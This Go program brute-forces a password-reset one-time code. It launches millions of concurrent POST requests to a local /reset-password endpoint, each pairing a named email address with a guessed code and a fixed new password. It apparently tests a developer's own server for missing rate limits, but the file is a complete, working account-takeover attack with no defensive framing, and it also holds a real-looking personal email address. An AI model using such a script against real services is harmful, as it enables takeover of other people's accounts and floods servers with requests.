package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
)

func makeRequest(otp string, ch chan <-string) string{
url := "http://localhost:8080/reset-password"
  method := "POST"

  payloadMap := map[string]interface{}{
        "email":       "swarnikarajsingh@gmail.com",
        "otp":         otp,
        "newpassword": "asdsdss",
    }

  payloadJSON, err := json.Marshal(payloadMap)
    if err != nil {
        fmt.Println("Error:", err)
        return err.Error()
    }

  payload := strings.NewReader(string(payloadJSON))
  client := &http.Client {}
  req, err := http.NewRequest(method, url, payload)

  if err != nil {
    fmt.Println(err)
    return err.Error()
  }
  req.Header.Add("Content-Type", "application/json")
  res, err := client.Do(req)
  if err != nil {
    fmt.Println(err)
    return err.Error()
  }
  defer res.Body.Close()

  body, err := ioutil.ReadAll(res.Body)
  if err != nil {
    fmt.Println(err)
    return err.Error()
  }
 ch<- string(body)

  fmt.Println(string(body))
  return string(body)
}
func main() {
 ch := make(chan string)
 for i:=0;i<9999999;i++{
   go makeRequest(strconv.Itoa(i), ch)
 }
  
   
   apiresponse:=<-ch
   fmt.Println(apiresponse)
}